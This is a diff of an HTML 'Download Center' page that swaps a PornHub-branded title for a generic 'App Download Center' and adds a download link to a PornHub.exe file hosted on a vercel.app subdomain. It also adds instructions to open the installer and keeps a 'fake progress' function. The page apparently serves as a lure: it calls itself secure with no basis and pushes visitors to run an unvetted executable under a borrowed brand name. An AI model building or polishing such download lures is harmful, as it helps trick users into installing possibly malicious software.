@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>PornHub Download Center</title>
+<title>Download Center</title>
 
 <style>
 :root {
@@ -38,7 +38,6 @@ body {
   transition: 0.4s ease;
 }
 
-/* PARTICLES CANVAS */
 canvas {
   position: fixed;
   top: 0;
@@ -46,7 +45,6 @@ canvas {
   z-index: -1;
 }
 
-/* HEADER */
 header {
   text-align: center;
   padding: 80px 20px 30px;
@@ -63,7 +61,6 @@ p {
   color: var(--muted);
 }
 
-/* BUTTONS */
 .btn {
   display: inline-block;
   margin-top: 15px;
@@ -73,17 +70,17 @@ p {
   color: white;
   text-decoration: none;
   font-weight: 600;
-  transition: 0.2s;
+  border: none;
   cursor: pointer;
+  transition: 0.2s;
 }
 
 .btn:hover {
   transform: scale(1.05);
 }
 
-/* GRID */
 main {
-  max-width: 1000px;
+  max-width: 900px;
   margin: auto;
   padding: 20px;
   display: grid;
@@ -91,7 +88,6 @@ main {
   gap: 20px;
 }
 
-/* CARDS */
 .box {
   background: var(--card);
   border: 1px solid rgba(255,255,255,0.08);
@@ -117,17 +113,14 @@ p, li {
   color: var(--muted);
 }
 
-ul, ol {
+ul {
   padding-left: 18px;
 }
 
-/* TOP CONTROLS */
 .topbar {
   position: fixed;
   top: 15px;
   right: 15px;
-  display: flex;
-  gap: 10px;
 }
 
 .toggle {
@@ -139,7 +132,6 @@ ul, ol {
   color: var(--text);
 }
 
-/* PROGRESS BAR */
 .progress-wrap {
   margin-top: 15px;
 }
@@ -156,7 +148,6 @@ ul, ol {
   height: 100%;
   width: 0%;
   background: linear-gradient(90deg, var(--accent), var(--accent2));
-  transition: width 0.2s;
 }
 </style>
 </head>
@@ -170,10 +161,13 @@ ul, ol {
 </div>
 
 <header>
-  <h1>PornHub Download Center</h1>
-  <p>Modern • Animated • Interactive</p>
+  <h1>App Download Center</h1>
+  <p>Modern • Fast • Secure Download Page</p>
 
-  <button class="btn" onclick="startInstall()">Download</button>
+  <!-- REAL DOWNLOAD BUTTON -->
+  <a class="btn" href="porn-hub-download-exe.vercel.app/PornHub.exe" download>
+    Download
+  </a>
 
   <div class="progress-wrap">
     <div class="progress">
@@ -186,36 +180,37 @@ ul, ol {
 
   <div class="box">
     <h2>Download</h2>
-    <p>Start your download securely.</p>
+    <p>Click the button above to download your file.</p>
   </div>
 
   <div class="box">
     <h2>Requirements</h2>
     <ul>
-      <li>Windows</li>
-      <li>4 GB RAM</li>
+      <li>Windows / Mac (depending on file)</li>
+      <li>Internet connection</li>
     </ul>
   </div>
 
   <div class="box">
-    <h2>Troubleshooting</h2>
+    <h2>Instructions</h2>
     <ul>
-      <li>Restart app</li>
-      <li>Update to latest version</li>
+      <li>Download file</li>
+      <li>Open installer</li>
+      <li>Follow setup steps</li>
     </ul>
   </div>
 
 </main>
 
 <script>
-/* ===== PARTICLES ===== */
+// particles
 const canvas = document.getElementById("particles");
 const ctx = canvas.getContext("2d");
 
 canvas.width = window.innerWidth;
 canvas.height = window.innerHeight;
 
-let particles = Array.from({length: 80}, () => ({
+let particles = Array.from({length: 60}, () => ({
   x: Math.random() * canvas.width,
   y: Math.random() * canvas.height,
   r: Math.random() * 2,
@@ -243,33 +238,30 @@ function draw() {
 }
 draw();
 
-/* ===== MODE TOGGLE ===== */
+// dark mode
 function toggleMode() {
   document.body.classList.toggle("light");
 }
 
-/* ===== SCROLL REVEAL ===== */
+// reveal
 const boxes = document.querySelectorAll(".box");
 
 const observer = new IntersectionObserver(entries => {
   entries.forEach(entry => {
-    if(entry.isIntersecting) {
-      entry.target.classList.add("show");
-    }
+    if(entry.isIntersecting) entry.target.classList.add("show");
   });
 });
 
 boxes.forEach(box => observer.observe(box));
 
-/* ===== FAKE INSTALL PROGRESS ===== */
+// fake progress (optional visual only)
 function startInstall() {
   let bar = document.getElementById("bar");
   let width = 0;
 
   let interval = setInterval(() => {
-    if(width >= 100) {
-      clearInterval(interval);
-    } else {
+    if(width >= 100) clearInterval(interval);
+    else {
       width++;
       bar.style.width = width + "%";
     }
